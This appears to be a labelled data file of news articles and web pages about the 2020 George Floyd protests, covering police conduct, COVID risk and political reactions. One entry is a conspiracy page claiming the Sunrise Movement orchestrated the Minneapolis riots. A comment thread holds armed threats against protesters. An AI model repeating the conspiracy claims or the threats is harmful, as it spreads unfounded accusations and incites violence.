follow the guidance of local health officials and take precautions to protect themselves from the novel coronavirus. ""We encourage all those protesting around the world to do so safely,"" he said, ""Clean your hands, cover your cough and wear a mask if you attend a protest."" He also advised people to maintain a safe distance from others â€” and to stay home if they are sick. ""The riskiest situation to be in is to be in close proximity to a case, particularly a symptomatic case, of COVID-19,"" said Michael Ryan, director of WHO's health emergencies program at the Monday press conference, so healthy people protesting next to one another may not meet the definition of coming in contact with the disease. However, it's become clear to researchers that the new coronavirus can be spread by people who aren't showing symptoms of it. ""Local public health official[s], on the basis of abundance of caution, could advise people either to quarantine or to get tested [after attending a mass gathering],"" Ryan said. Local officials have expressed similar worries about the interplay of the protests and the pandemic. Last week Washington, D.C., Mayor Muriel Bowser said she was concerned about what mass gatherings in the streets ""could mean for spikes in our coronavirus cases later."" She urged protesters to consider their exposure and consider being tested. Denver Mayor Michael Hancock announced free tests for demonstrators. Officials in Atlanta and New York have suggested testing as well. ""Testing everyone that participated in demonstrations would be useful in communities where many new cases are being reported every day. These new cases indicate that transmission is occurring at a high rate in the communities,"" said Bill Miller, an epidemiologist and physician at Ohio State University. He said an alternative to testing everyone would be active contact tracing. ""With new cases, the tracers could ask about demonstration participation, including days and times,"" Miller said. Then, if cases are linked to a demonstration, a call could go out to get everyone who participated in that event to be tested. Being outdoors seems to reduce the risk of exposure because the virus can't survive long in sunlight and there's better air circulation, but it's no guarantee against infection. Health experts warn that some activities linked with the protests â€” such as riding public transportation to attend rallies or getting arrested and jailed indoors with others â€” could increase a person's risk of getting exposed to the virus. Meanwhile, protests are expected to continue in the days ahead. George Floyd's burial service will take place on Tuesday at a private service in Houston.

1,"HOME ACCESS GALLERY NEWS SHOP CONTACT More We have sources imbedded within these groups to get to the bottom of where all this leftist radicalization is coming from. We got their plans, manuals, intercepted internal communications, and have recordings of their zoom chats. What you are about to see is part of a two year undercover investigation into the leftist radicalization imbedded within the climate justice movement that contributed to the riots in Minneapolis, Minnesota. In this first video, we are going to show how the Sunrise Movement played a preemptive role in carrying out the mayhem, taking advantage of George Floyd's death and using it as a trigger point, to further push their Green New Deal agenda and promoting the abolition of the police. We didnâ€™t expect to find organizers radicalizing middle school and high school children teaching them military tactics and preparation for high risk actions. Some of these tactics include escalation provocation techniques, blocking freeway traffic, and how to get arrested bogging-down law enforcement in the name of destroying capitalism to make way for the Green New Deal. What some parents may have though were innocent youth organizations genuinely fostered and ran by children are actually top-down monolithic structures with private intelligence, military contractors, and foreign interests influencing children to carry out their subversive objectives. The events that erupted in Minneapolis, Minnesota were not a spontaneous reaction to the murder of George Floyd. These were well planned events anticipating some perfect trigger point to bring about the â€œnew normalâ€ - a world without police, without borders, without industry, without wealth, without private property, without an economy - a world based on communist ideals imbedded within the Green New Deal. The Green New Deal is not about climate change, it is about climate justice - a radical new ideology hellbent on destroying western civilization under the false pretense that white supremacy is the leading cause of climate change, social injustice and all problems globally. The organizers of these Youth Non-government Organizations, or Youngos, embellish white supremacy as a systemic problem, hyper-focusing on statistically rare instances of racial inequality and injustice, while ignoring great strides of progress the United States has made over the past century towards equal opportunity and criminal justice reform. However, in order to normalize radical policies put forth by the Green New Deal, crises have to be capitalized on to further their agenda while destroying the great accomplishments of civil rights movements of the past. CORRECTION: Aaron Berger is the CEO of ""Asymmetrical Solutions"" not ""Asymmetric Solutions"". Asymmetric Solutions is not involved with the Sunrise Movement."
1,"An entire tactical unit of a US police department has quit after two officers accused of brutality were placed on unpaid leave, reports local media. In a video that went viral on Thursday, officers in the city of Buffalo, New York, were seen shoving an elderly man to the ground. The 75-year-old was seriously injured, and taken to hospital. All 57 officers in the riot squad have now reportedly resigned in protest at their two colleagues' suspension. According to the Buffalo News, the members have stepped down from the Emergency Response Team, but not the police department itself. John Evans, president of the local police union, told the newspaper: ""Our position is these officers were simply following orders from Deputy Police Commissioner Joseph Gramaglia to clear the square. ""It doesn't specify clear the square of men, 50 and under or 15 to 40. They were simply doing their job. I don't know how much contact was made. He did slip in my estimation. He fell backwards."" New York Governor Andrew Cuomo said on Friday the two officers should be fired, and called for the incident to be investigated for ""possible criminal charges"". In a statement, Buffalo Mayor Byron Brown said: ""We can confirm that contingency plans are in place to maintain police services and ensure public safety within our community."" He added that Buffalo police are continuing to work with other law enforcement agencies. The officers were enforcing a curfew as a result of protests that have spread nationwide since the death in Minneapolis last month of an unarmed black man, George Floyd, after a policeman knelt on his neck for nearly nine minutes. The man is seen approaching a group of riot police as they advance. Two of the officers appear to push the 75-year-old, causing him to fall backwards and hit his head. An initial statement from Buffalo Police Department said the man had ""tripped"" and fallen during a ""skirmish involving protesters"". Police spokesman Jeff Rinaldo later attributed the statement to officers not directly involved in the incident. His name is Martin Gugino, and authorities said he was taken to hospital, where he was in a stable but serious condition on Friday. Mr Gugino is a longtime social justice activist in Buffalo, according to advocacy group Push (People United for Sustainable Housing). He ""has been a tireless fighter against injustice of all types for many years in our city both with Push and other grassroots organisations,"" they said in a statement, condemning police for his treatment.

1,"Democratic Senators have blocked a Republican police reform bill, leaving the legislation dead on the floor of Congress and likely defeating any Federal attempt to address police reform as a whole. The bill failed before its text ever made it to the floor. Democrats were able to marshal their caucus to defeat a vote designed to bring the issue to the floor for debate and killed the bill 55-45. A total of 60 votes would have been necessary to move the bill forward. â€œRepublicans had 53 votes, but not enough Democrats joined them,â€ Fox News reports. Only Sen. Joe Manchin (D-WV), Sen. Doug Jones (D-AL), and Sen. Angus King (I-ME) crossed partisan lines. Democrats fought the Republican bill, led by Sen. Tim Scott (R-SC), which they said did not go far enough in addressing critical issues at the crux of police reform. The bill did not ban the use of chokeholds outright, preferring instead to warn departments to craft their own policies against the practice or risk losing federal funds. The bill also shied away from outlawing so-called â€œno-knockâ€ warrants, preferring instead to establish a national database to track those warrantsâ€™ use and abuse. The House of Representatives, led by Speaker Nancy Pelosi (D-CA), has its own bill which the Democratic caucus plans to bring to the floor there on Thursday. Senate Majority Leader Mitch McConnell (R-KY) was apoplectic about the situation in an interview that took place just after the procedural vote failed. â€œThe Senate was supposed to officially take up police reform on the floor today. Instead, our Democratic colleagues are poised to turn this routine step into a partisan impasse,â€ he told reporters, adding that the bill could have been the subject of debate and compromise, but Democrats refused to come to the bargaining table. McConnell called Democratsâ€™ strategy in proposing the bill â€œbizarre,â€ particularly given that they refused to even agree to debate the measure. â€œThey donâ€™t want a debate, they donâ€™t want amendments, theyâ€™ll filibuster police reform from even reaching the floor of the Senate unless the majority lets the minority rewrite the bill behind closed doors in advance,â€ McConnell said. The lead up to Wednesdayâ€™s vote has been acrimonious, sometimes to a shocking degree. Speaking late Tuesday, Pelosi accused Republicans, including Scott â€” the first black man to serve in both the House and Senate â€” of â€œtrying to get away with murder, actually â€“ the murder of George Floyd.â€ When pressed on the fact that her statement could be considered racially charged, Pelosi refused to apologize. On Wednesday, Senate Minority Leader Chuck Schumer (D-NY) attacked McConnell directly, warning the ranking Republican that he did not have â€œCivil Rights leadersâ€ on his side. Since it is unlikely that the Senate will take up any House bill on the issue of police reform, itâ€™s likely that efforts have ended to pass federal legislation on the matter, despite a nationwide movement.

1,"By Paul LeBlanc, CNN  Updated 12:58 AM ET, Tue June 2, 2020 (CNN)Illinois Gov. J.B. Pritzker on Monday labeled President Donald Trump ""a miserable failure"" as nationwide protests have intensified over the death of George Floyd. "
1,"President Donald Trump announced a crackdown on nationwide anti-racism protests in a surreal speech Monday from the White House Rose Garden while police flash-bang explosions could be heard nearby. Speaking as police deployed tear gas on protesters just outside the White House, Trump vowed harsher action against protesters. The president made no mention of violent actions taken by police in recent days against protesters, nor did he make any call for national unity. Instead, he said he would mobilize â€œall available federal resources, civilian and military, to stop the rioting and looting, to end the destruction and arson, and to protect the rights of law-abiding Americans, including your Second Amendment rights.â€ He specifically called on governors across the country to deploy the National Guard and vowed to deploy the U.S. military if states refused to comply. â€œMayors and governors must establish an overwhelming law enforcement presence until the violence has been quelled,â€ Trump said. Activating the military would require Trump to invoke the Insurrection Act, an 1807 law that allows the president to deploy active-duty military on U.S. soil. The statute was last used during the 1992 uprising in Los Angeles over the acquittals of police officers involved in the brutal beating of Rodney King, a Black motorist. Protesters were peacefully gathered outside the White House even as Trump began speaking. Authorities, however, fired tear gas and flash-bang grenades in an attempt to move them away from the area before the presidentâ€™s address began. We can hear the explosions from the streets as Trump is speaking in the Rose Garden. pic.twitter.com/yRporcjN0T Here's the moment where police fired teargas into a crowd of peaceful protesters in Lafayette Park, just minutes before Trump's address in the Rose Garden. pic.twitter.com/KPjxMKdDyx The public areas around the White House, particularly Lafayette Square, have been host to demonstrations for four days. On Sunday night, peaceful gatherings turned violent as police clashed with some protesters and several nearby buildings were vandalized or burned. Calling himself â€œyour law-and-order president,â€ Trump pledged to escalate efforts to clamp down on the protests in Washington. â€œAs we speak, I am dispatching thousands and thousands of heavily armed soldiers, military personnel and law enforcement officers to stop the rioting, looting, vandalism, assaults and the wanton destruction of property,â€ Trump said. As his remarks ended, Trump said he was leaving to go pay his respects â€œto a very, very special place.â€ He later walked through Lafayette Park, which had minutes earlier been filled with demonstrators, on his way to St. Johnâ€™s Church, where he posed for a photo while holding up a Bible and then left. Trump holds up a bible, literally shushes reporters trying to ask him about his threat to use the military against citizens, poses for a photo, and leaves. pic.twitter.com/w2lPWWjMKu The presidentâ€™s remarks came amid nationwide protests following the police killing of George Floyd in Minneapolis last week. Tens of thousands have taken to the streets of American cities demanding justice for Floyd and other Black victims of police brutality. In many of those cities, police have deployed violent tactics to attempt to quell demonstrations, including firing rubber bullets and tear gas, pepper-spraying crowds and hitting people with batons. Trump has been at odds with several governors as protests over Floydâ€™s death have spread across the nation. In a call on Monday, he said state leaders were â€œweak,â€ urging them to arrest demonstrators and â€œput them in jail for 10 years.â€ â€œYou have to dominate. If you donâ€™t dominate, youâ€™re wasting your time,â€ the president said during the call. â€œTheyâ€™re going to run over you. Youâ€™re going to look like a bunch of jerks. You have to dominate.â€ The language built on Trumpâ€™s vocal denouncements of demonstrators as â€œthugs.â€ In a widely criticized missive on Twitter, the president threatened violent intervention and said he would send in the National Guard should protests continue. â€œAny difficulty and we will assume control but, when the looting starts, the shooting starts,â€ he said of the rising protests in Minneapolis at the time. Twitter quickly appended a note to the tweet, saying it violated rules about glorifying violence. Do you have information you want to share with HuffPost? Hereâ€™s how."
1,"Following weeks of protests about police brutality and racism, many activists have begun calling out the band Dixie Chicks to change their name, claiming the word â€œDixieâ€ harbors â€œthe epitome of white America.â€ The Dixie Chicks, a band composed of Natalie Maines and twin sisters Martie Maguire and Emily Strayer, is a country band that was started in 1989. The Chicks soared to popularity until a comment by Maines about President George W. Bush in 2003 sent their career on a downward spiral from which it never fully recovered. In London for a concert, Maines told the crowd in 2003, â€œWeâ€™re ashamed that the president of the United States is from Texas.â€ They were instantly dropped from multiple country radio stations and boycotted by most of their fans. With the announcement of a comeback album called â€œGaslighter,â€ slated to release in July 2020, the band was asked about changing its name because of the alleged racial connotations tied to it. According to dictionary.com, the word â€œdixieâ€ describes â€œthe southern states of the United States, especially those that were formerly part of the Confederacy.â€ The origin of the word â€œdixieâ€ being used to describe the southern states is unknown, but some believe it could have been after Jeremiah Dixon, one of the men who established the Mason-Dixon Line, or after â€œdixâ€ which was the name of a Louisiana $10 bill before the Civil War. Other theories are that it could have come about due to the song â€œDixieâ€ that was written by Daniel Decatur Emmett in 1859, or that a slave owner named â€œDixâ€ was so kind to his slaves that when they left, they had fond memories of living in â€œDixieâ€™s Land.â€ Variety has a different approach, saying that dixie is â€œthe epitome of white America, a celebration of a Southern tradition that is invisible from Black Slaves and those grand plantations where they were forced to toil for free.â€ As of this writing, the Dixie Chicks have not released a statement regarding their name. The Chicks are not the only band that has been pressured to make a name change. Popular country band and five-time Grammy award winners Lady Antebellum recently changed their name to Lady A because of the meaning of â€œantebellum.â€ The band, comprised of Charles Kelley, Hillary Scott and Dave Haywood, posted a statement on its Instagram page. It partly reads, â€œWe feel like we have been Awakened, but this is just one step. There are countless more that need to be taken. We want to do better. We are committed to examining our individual and collective impact and making the necessary changes to practice antiracism.â€ The word â€œantebellumâ€ is Latin and means â€œbefore the war.â€ While it seems vague, many agree that it is referring to the Civil War specifically. While the bandâ€™s name change was met with some praise, not everyone was happy. Rogan Oâ€™Handley, a lawyer and journalist, tweeted, â€œI would love to say Iâ€™m now boycotting Lady Antebellum b/c of their cowardice, but I never liked their music anyway.â€ â€œLove your music. Now it is tainted to me forever. How easy it is to follow the sheep,â€ one fan said. Another fan responded to the news, â€œYep Iâ€™m out. You just donâ€™t have what it takes. You took a knee and bowed under pressure.â€ Copyright 1998-2021 CNSNews.com. CNSNews.com is a division of the Media Research Center.

1,"Become a member Learn more Activist Miracle Boyd of GoodKids MadCity was injured by police in an attack caught on video. ""You beat people up over a statue? You rough them up over a statue?"" Ald. Jeanette Taylor said. GRANT PARK â€” An 18-year-old activist who had just spoken to a crowd protesting at the Christopher Columbus statue in Grant Park had several front teeth knocked out by a Chicago Police officer Friday evening, according to video and multiple elected officials. An outraged Ald. Jeanette Taylor (20th) said Miracle Boyd, 18, of the group GoodKids MadCity was assaulted by a police officer during the tense Friday night protest where police pepper-sprayed protesters trying to tear down a towering, nearly 90-year-old statue of Columbus. Taylor, who knows Boyd, said the rising young activist was injured by police. Boyd was filming the encounter, in which she argued with officers away from the Columbus statue. At the end of her recording, her phone appears to be knocked away. A second video, posted to Twitter from someone filming across the street, shows an officer wearing shorts and a bike helmet swinging his left hand at her. She flees after he swings. .@chicagosmayor we now have the video of Miracle being sucker punched by CPD! They donâ€™t keep us safe! While theyâ€™re attacking a 2020 CPS graduates downtown, children were being shot tonight! A pregnant Womxn was shot & a 14 & 15y/o! You need to #DefundCPD now! pic.twitter.com/gYT4CL5HJ9 Ald. Taylor said watching video of the attack horrified her. Taylorâ€™s daughter is good friends with Boyd. â€œIâ€™m going to tell you right now, if this was my kid â€” and Miracle is one of mine â€” I would burn this city to the ground,â€ Taylor said. â€œYou beat people up over a statue? You rough them up over a statue? â€œTheyâ€™re so busy protecting white supremacy, theyâ€™re so busy protecting a Christopher Columbus statue that they beat her.â€ On Sunday, Boyd told Block Club she had been trying to assist a protester she saw being arrested when two officers approached her, one with dark gray facial hair and sunglasses. â€œHe walked up to me and smacked me,â€ Boyd said Sunday. â€œI donâ€™t know if the phone hit me in the mouth, I donâ€™t know if his hand hit me in the mouth. â€œBut the way that I was recording, I think that he tried to smack the phone in my hand and he hit me at the same time, and the phone hit me in the mouth, and it knocked my tooth out and I was bleeding.â€ RELATED: Protesters Try To Tear Down Columbus Statue In Chicago As Clashes Between Police, Activists Turn Violent GoodKids MadCity tweeted in the aftermath, showing Boyd suffered multiple injuries to her face and chipped teeth. They later tweeted the video footage they said showed a police officer beating Boyd in the face. Essence Gatheright, a 16-year-old member of Chicago Freedom Schoolâ€˜s youth leadership board who was at the protest, said Boyd spoke at the rally earlier that night. Gatheright helped get Boyd get medical attention at the Freedom School after she was hit. â€œHer teeth came out, it was really bad,â€ Gatheright said. â€œShe was bleeding, she kept crying and sobbing. It was a really messed up situation. â€¦ We were able to walk her and others to the school and provide her with support and make sure she got home safely.â€ Ald. Taylor said Boyd is â€œa good kid, a CPS graduateâ€ who has helped raise money for the most vulnerable in her community. â€œI donâ€™t care if you become the president, the mayor, the garbage man â€” you are not exempt from this country and what its racist ass will do to you,â€ Taylor said. Through tears, Taylor said she was tired. â€œHow many more times are we going to go through this?â€ State Sen. Robert Peters posted the photo of Boydâ€™s injuries, saying he had just offered her an internship last week because she is â€œfighting gun violence everyday.â€ â€œShe is just over 5 ft, 100 pounds. Tonight a police officer beat her. Knocked out her teeth,â€ Peters tweeted. â€œIâ€™m sad, angry, and disgusted.â€ Kofi Ademola, an organizer with Black Lives Matter Chicago, also tweeted about the case Friday, saying â€œDonâ€™t let the Mayor or city Council sleep until we get the justice we demand!â€ Boyd is a recent graduate of Sarah E. Goode STEM Academy in Ashburn. â€œOnly you can determine where life takes you.â€@GoodeSTEM graduate Miracle Boyd is headed to @DePaulU next to study accounting â€“ congratulations! #BetterMakeRoomChicago pic.twitter.com/KpQjP9UaPE Last weekend, she helped lead a protest through Washington Park and Woodlawn in memory of friends lost to violence. She said more policing is not the answer and demanded that Mayor Lori Lightfoot divest from the Chicago Police Department and direct the money to communities instead. â€œWeâ€™re the people of the community. I donâ€™t see you [Mayor Lightfoot] out here organizing people,â€ Boyd said. â€œâ€¦ We are the ones in our community that have to deal with the trauma.â€ She was recently featured in a Block Club Chicago story about the Washington Park protest. She also co-wrote a story about activism in Injustice Watch. Friday eveningâ€™s protest ended in in clashes between police and demonstrators, some of whom attempted to pull down the statute of Christopher Columbus in the southern edge of the park. Police eventually converged on the area, using pepper spray to push back protesters. Video tweeted from reporters and demonstrators shows multiple physical confrontation. In a statement, the Chicago Police News Affairs office said it was not aware of the Boyd incident. â€œThe Chicago Police Department strives to treat all individuals our officers encounter with respect,â€ according to the statement. â€œWe do not tolerate misconduct of any kind and if any wrongdoing is discovered, officers will be held accountable. Anyone who feels they have been mistreated by a CPD officer is encouraged to call 311 and file a complaint with COPA, who will investigate allegations of misconduct.â€ During the protest last week in Washington Park, Boyd and other activists detailed proposals about reducing violence in their communities, calling on the city to reallocate 2 percent of the Chicago police budget to services like robust mental health, schools and grocery stores. That money would help support violence interrupters and other residents doing ground-level work to keep communities safe through direct action with gang members. Peace treaties, accountability, trauma-healing and a restorative justice process are all part of the plan, Boyd said. You can donate to help Boyd with needed medical care here.

ATLANTA â€” Protesters caused extensive damage to the Georgia State Patrol headquarters in Atlanta early Sunday by sparking flames inside the building with fireworks, breaking windows and spraying graffiti, the agency said. Department of Public Safety workers put out the fire, and two employees were treated for smoke inhalation, Georgia State Patrol Lt. Stephanie Stallings said in a statement. One of the agencyâ€™s vehicles parked in front of the building was also damaged. Video showed several dozen people outside and the sound of drums being played in the background. Smoke could be seen through a glass window of the building after a red flash was seen inside.

The incident was under investigation and no arrests had been made, the statement said. The demonstration started peacefully, said Kimberly Krautter, who recorded video of the fire. â€œOnly about three or four peopleâ€ looked to be trying to vandalize the building, she said. Protests have taken place in Atlanta over the past month in response to the deaths of Rayshard Brooks and George Floyd, but the subject of this protest wasnâ€™t clear, Krautter said. The building is located about 3 miles (5 kilometers) southeast of downtown. It also houses a number of other state agencies, news outlets reported.  Copyright Â© 2021 The Washington Times, LLC.

1,"A Northeast Florida Sheriff facing a competitive primary used department resources to make a self-promotional video this week under the guise of combatting civil unrest. The message to would-be protesters: â€œYouâ€™ve been warned.â€ (The message to political opponents, meanwhile, is one of the power and prerogatives of incumbency, especially in a crowded field of candidates.) Clay County Sheriff Darryl Daniels released Tuesday a red meat video vowing to, if needed, deputize gun owners in the event Black Lives Matter protesters came into the county. â€œSomebody has to step up in front of the camera and say â€˜enough is enough,'â€ said Daniels, vowing that â€œif we canâ€™t handle you â€¦. Iâ€™ll make special deputies of every lawful gun owner in this county.â€ The warning (not a â€œthreat,â€ Daniels says repeatedly), is especially interesting, given that Camp Blanding, from which the National Guard could deploy as it did during riots in actual cities, is in the county. The three-minute video is full of the kind of bluster that traditionally plays well in Clay. â€œIf you threaten to come to Clay County and think for one second weâ€™ll bend our backs for you, youâ€™re sadly mistaken,â€ Daniels said. â€œYou can threaten all you want, you can say â€˜letâ€™s go to Clay Countyâ€™,â€ but â€œyouâ€™ll have something waiting for you you donâ€™t want,â€ he added. â€œThe second you step out from under the protection of the Constitution, weâ€™ll be waiting for you, and youâ€™ll have everything you want. All the publicity, all the pain, all the glamour and glory, for all that five minutes will give you,â€ Daniels promised, in a video that plays up contrasts between Clay County and urban areas, with a little flash for Fox News should they pick it up. â€œGod is absent from the mediaâ€™s message or Black Lives Matter or any other group out there thatâ€™s making themselves a spectacle,â€ Daniels theorized. Wherever God is or isnâ€™t, Daniels himself picked up earned media at the right time, running fourth in the money race for the August primary. Daniels, who has $38,514 on hand, trails opponents Ben Carroll, Michelle Cook, and Mike Taylor. Cook said Daniels was acting like a â€œreality show sheriffâ€ and called the video a â€œpolitical scam.â€ However, in a seven-way race, the ability to leverage the public resources with the needs of a corporate media starved for any content that affirms the social order has a value that wonâ€™t show up in campaign finance, but could show up in October. Despite an FDLE investigation dating to last summer, polling this spring showed Daniels well positioned in August, with strong approval numbers. This video probably wonâ€™t hurt those numbers. A.G. Gancarski has been a correspondent for FloridaPolitics.com since 2014. In 2018, he was a finalist for an Association of Alternative Newsweeklies ""best political column."" He can be reached at [email protected] July 1, 2020 at 9:12 am What could possibly go wrong? July 1, 2020 at 10:16 am So help me God, the sheriffâ€™s speech is a threat. Deputizing every lawful gun owner is not good law enforcementâ€¦ too many folks with guns are looking to hurt the protesters. Their excuse for shooting at protesters will be stand your ground (when a protester spray paints confederate monument) July 1, 2020 at 11:56 am legitimate protestors do not spray paint or destroy property. rioters and looters do those things. legitimate peaceful protestors have nothing to worry about. rioters and looters have been warned. good for the sheriff. we need more like him in this country! July 1, 2020 at 2:02 pm If they come to my home, my kids, my families and want to do harm.. no that is NOT OKAY.. What have they done for their country except to destroy innocent peoples livelihood. Come my way, go out my way July 1, 2020 at 8:03 pm IF those of US with guns were looking to hurt PROTESTORS, they would all be hurt by now. Itâ€™s NOT us you need to fear. The sheriff is speaking about the LOOTERS breaking into homes and businesses. Pull your head out of your ass. July 1, 2020 at 8:11 pm Donâ€™t break the law and you have nothing to worry about. July 2, 2020 at 12:30 pm All citizens have the right to defense of person and property..rioting law breakers surrender their rights..much like a liquor store banditsâ€¦those rights end immediatelyâ€¦ July 1, 2020 at 9:56 am Distraction that the sheriff screws around on his wife. He ainâ€™t no roughy. Him is a married man fornicating with other women! Clay County defund this sheriff ! His pc is bs! July 1, 2020 at 11:21 am What no free gas cards? Play to your base. Watchout for all those protestors coming to Middleburg! Who wants to protest in the middle of nowhere?? How much time & money was spent on this propaganda? Darryl should be fired for fraud,waste, & abuse. If we had a real guv he wouldâ€™ve been gone a long time ago. July 1, 2020 at 11:48 am When does someone â€œstep out from under the protection of the Constitutionâ€? NEVER. Moronic, ignorant thug. Even if and when you break the law you are STILL under the protection of the Constitution, you idiot. July 1, 2020 at 8:48 pm My comment, exactly! The Constitution covers the whole United States, even Clay County, FL. July 3, 2020 at 12:12 am huh? he said he is protecting the constitution not stepping out from it. sheesh you people already twisting words July 1, 2020 at 12:02 pm This man is an utter disgrace. Of course, the fact that he feels comfortable indulging in such barbaric campaign speech is itself a reflection of the mindset of the plurality of voters heâ€™s pandering to. Has he forgotten about his adulterous comings and goings with a former JSO corrections officer that he seemingly had arrested under false pretenses to cover up his dirty tracks? Some voters surely havenâ€™t forgotten. A pitiful joke, he is. Its time for Clay to elect a new sheriff. July 1, 2020 at 12:15 pm the mindset of the plurality of voters heâ€™s pandering to.â€ Oh, those of us who wish to protect our families and property from LAWLESS rioters and looters? THAT â€œplurality of votersâ€? If so you can kiss my you know what! Who the H3LL are YOU to tell me that I can not protect myself, my family, my property, and the public property that my tax dollars help maintain! YOU madam can take a long walk off a short pier! July 1, 2020 at 12:12 pm I loved the video! He is stating what is needed in this country! Tearing up businesses, destroying historical monuments, attacking police and civilians is a felony and should be treated as such! I would proudly stand with our sheriffs and police as a lawful gun owner! I would gladly serve and protect our America. You sir, are on the wrong side! Your journalism is part of the problem! You should be fired. July 1, 2020 at 12:21 pm EXACTLY! These liberals are so dense they have blurred the lines between legitimate peaceful protestors and rioters and looters! To think that rioters and looters have the same Constitutional right to destroy property and harm citizens is INSANE! No one, NO ONE is going to stop ME from protecting myself, my family, my property, and the public property that my tax dollars support! NO ONE! July 2, 2020 at 9:27 pm Amen July 1, 2020 at 12:32 pm Bunch of cry babies in these comments. Stay out, stay away or else. Play stupid games win stupid prizes. Fair warning. Enough is enough. Donâ€™t like it, tough. July 1, 2020 at 12:41 pm â€œcry babies â€ â€“ Feel good, indoctrinated Liberals. The Communists used to ( probably still do) call them USEFUL IDIOTS. July 1, 2020 at 1:44 pm Well the first paragraph of this article certainly makes it clear which side the author is on. I am so sick and tired of the gd media and their support of the lawless and violent rioters, looters, and vandals that are desecrating monuments, destroying businesses and private property in our cities. I say hooray for this sheriff and if I was in Clay I would gladly volunteer to become a deputy in his service. As is it I am ready and waiting for these maggots to come to my neck of the woods. Got my Mossberg 12 gauge pump and 100 rounds of ammo ready and waiting. Bring it scumbags! July 1, 2020 at 1:47 pm Good for the residents of Clay county. July 1, 2020 at 1:50 pm boy byeâ€¦ July 1, 2020 at 3:00 pm What and idiot! Deputies any and everybody with a gun. That makes perfect sense. We see what happens when trained people are given a weapon a and badge. What could possible go wrong with a bunch of hyped up hot heads walking around with guns ready to shoot. July 1, 2020 at 3:27 pm Would you rather the sheriff sit back and let the rioters and looters come in and burn down businesses and let them beat and kill the people that lives there?or shoot the police officers that are trying to protect us? I guess Iâ€™m one of them hyped up hotheads cause I will shoot anyone that tries to harm my family or property! What would you do if they came after you and your family?? July 1, 2020 at 4:03 pm What â€œANDâ€ idiot? You must be talking to yourself. Deputize <â€” not Deputies Also if you paid any attention to the video, he said he would deputize every ""LAWFUL GUN OWNER"" in the county. One other thing, please take note, this is a duly elected BLACK man speaking out against the terrorist organization BLM. More power to him. July 1, 2020 at 3:57 pm AMEN!!!!! Thatâ€™s how things get back in order. Way to go Sheriff. July 1, 2020 at 4:22 pm About time a politician took steps to protect the voting public, as opposed to pandering to looters and rioters. He stated that he might deputize â€œlawful gun owning citizensâ€. I would guess he is referencing gun owning concealed carry permit holders. Those same honest citizens whose finger prints, photo and background checks have been performed. Of course the ultra liberal snowflakes oppose this. That is until they are threatenedâ€¦ July 1, 2020 at 4:44 pm Not from Clay county, but definitely armed and will defend our property. Good for this sheriff â€“ we have enough thugs and punks without opening the door to rioters, looters and Soros hired disrupters. People need to wake up. July 1, 2020 at 9:13 pm Amen! I want to move to Clay County. I admire the sheriffâ€™s thinking. Enough lawlessness! July 1, 2020 at 6:32 pm Wowâ€¦I see a few leftists have found their way here. I guess it canâ€™t be helped as the writer of this article is one of them. These â€œUrnalistsâ€ have enabled outright terrorism in our communities when they conflate peaceful protesters with rioters. His goal is to indoctrinate and activate the leftists. They need economic upheaval in order to beat Trumpâ€¦and thatâ€™s when the fun really begins. The true goal is to eliminate the Electoral College so States like New York and California dictate who runs the country. The key players never get caught as there are useful idiots that will do their job for them. Have you ever noticed Antifa leading a pack of rioters only for them to disappear when the police show up? That of course brings us to the crux of the problem hereâ€¦Protecting your homes, family, and neighbors are simply unacceptable to them. These are the same people not 6 months ago were screaming for you to disarm. First it was we just want the AR-15â€™sâ€¦then they wanted all â€œassault rifles,â€ and finally they claimed everyoneâ€™s semiautomatic weapons was their true target. Any real gun owner will tell you that 95% of all firearms in the US are semiautomatic. Then the so called â€œpeaceful protestsâ€ broke out. Seattle was having their very own Woodstock love in. Accept thatâ€™s not exactly how it went down is it leftists? You had the warlord of Chaz (never call it Chop) handing out AR-15â€™s to drug addicts, felons, and 14 year old children (itâ€™s been recorded). Where oh where were the anti-gun nuts when all of this was happening? Thatâ€™s right, they were fueling the defund the police movement. You leftists have crossed a line you will never return from. We know what youâ€™re trying to do and we see everyone of your cities collapse before our very eyes. We know that youâ€™re nothing more than social vampires bleeding this nation of its resources. Too those in Clay Countyâ€¦.do you honestly think they wonâ€™t come for you? At current the leftists are attempting to push into every conservative run city, county, and municipality. Itâ€™s only a matter of time before they make a stop in your town. Addendum- â€œAssult rifleâ€ is a made up buzzword from the Clinton era. The â€œprotestersâ€ are anything but peaceful. Too those that watch the mass media todayâ€¦theyâ€™re all lying to you. If you want the real truth seek independent media. Tim Pool on YouTube is a great place to start. Watch his coverage and you will see the truth. July 1, 2020 at 8:07 pm OY. July 1, 2020 at 11:38 pm â€œOYâ€.. Oh Yeah! You bet your sweet *** if LOOTERS and RIOTERS come on MY property they WILL be dealt with accordingly. â€¦ Now, PEACEFUL protestors, thatâ€™s a different story. Iâ€™ll be out there handing them juice boxes and giving them hugs. July 2, 2020 at 7:41 am Didnâ€™t realize the Sheriff could mobilize the National Guard! Whoops, I mistook this article for journalism. July 2, 2020 at 12:40 pm â€œThey are just freedom fighters itâ€™s okâ€ just like Seattle you want a group to take over 6 city blocks and in those city blocks theyâ€™ve raped women killed kids beaten people up. Is that what you liberals want? Come to Florida the gunshine state and try that shit hereâ€¦ youâ€™ve been warned July 2, 2020 at 1:03 pm Wow you really took down my post? This web page must be run by liberals. Unbelievable. There goes freedom of speech. Itâ€™s ok to bash the sheriff call him a cheater, an idiot claim heâ€™s a fraud but if some one calls out the so called freedom fighters of Seattle the comment gets deleted. Come down to FLAWDA and get ya some! July 3, 2020 at 12:07 am So more untrained cops on the streets. sounds legit. â€œI see dead peopleâ€ July 3, 2020 at 1:45 pm I see a liberal scared Comments are closed.

1,"Laurel Wamsley As protests for racial justice in Portland have continued for more than 50 nights, striking new images and tactics have emerged â€“ particularly in resistance to the federal law enforcement officers whose actions have earned the ire of Oregonians who want them to leave. A group of women who call themselves the Wall of Moms has drawn national attention, clad in bike helmets and goggles. They link arms to form a protective barrier between law enforcement and Black Lives Matter protesters who took to the streets after the May 25 death of George Floyd at the hands of Minneapolis police. In a recent moment captured on video, a large crowd of the yellow-garbed women sing as if a lullaby, ""Hands up, please don't shoot me."" Moms sing lullaby â€œhands up please donâ€™t shoot meâ€ pic.twitter.com/GJhj8ymn12 Members of the Wall of Moms say they follow the directions of Black leaders, and that their driving vision is that ""we moms would take some physical hits in hopes our Black and Brown kids, friends, neighbors, and loved ones will be spared some pain."" In another video, also taken by freelance journalist Sergio Olmos, a protester uses a hockey stick to push back a canister of tear gas. Another uses a leaf blower to blow back the gas, a tactic used last year by protesters in Hong Kong. A protester uses a hockey stick to swing tear gas canister back, another uses a leaf blower pic.twitter.com/GSdFeErinC State and local leaders have repeatedly called for federal agents to leave the city, arguing that their presence has 